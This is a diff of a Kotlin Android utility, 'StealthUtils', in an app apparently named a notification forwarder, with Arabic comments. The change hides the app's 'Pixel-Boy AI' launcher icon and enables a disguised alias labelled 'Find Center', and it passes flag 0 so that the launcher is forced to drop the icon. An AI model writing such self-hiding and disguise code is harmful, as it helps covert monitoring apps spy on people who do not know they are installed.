@@ -9,31 +9,31 @@ object StealthUtils {
     fun switchToStealthMode(context: Context) {
         val packageManager = context.packageManager
 
-        // 1️⃣ ألياس العرض الأول (Pixel-Boy AI)
-        val pixelBoyAlias = ComponentName(
+        // ألياس الشاشة الرئيسية الأول (Pixel-Boy AI)
+        val launcherAlias = ComponentName(
             context.packageName,
             "com.itsazni.notificationforwarder.LauncherAlias"
         )
 
-        // 2️⃣ ألياس التمويه والاختفاء (مركز العثور)
+        // الألياس التمويهي الخلفي (مركز العثور)
         val stealthAlias = ComponentName(
             context.packageName,
             "com.itsazni.notificationforwarder.StealthAlias"
         )
 
         try {
-            // تفعيل "مركز العثور" في الخلفية والأجهزة
+            // 1️⃣ تفعيل الألياس المخفي ليبقى المكون حياً تحت اسم مركز العثور
             packageManager.setComponentEnabledSetting(
                 stealthAlias,
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP
+                0
             )
 
-            // إلغاء وتدمير أيقونة Pixel-Boy AI من الشاشة الرئيسية
+            // 2️⃣ تعطيل ألياس Pixel-Boy AI وتطبيق 0 لإجبار اللانشر على مسح الأيقونة من الشاشة
             packageManager.setComponentEnabledSetting(
-                pixelBoyAlias,
+                launcherAlias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
+                0
             )
 
         } catch (e: Exception) {
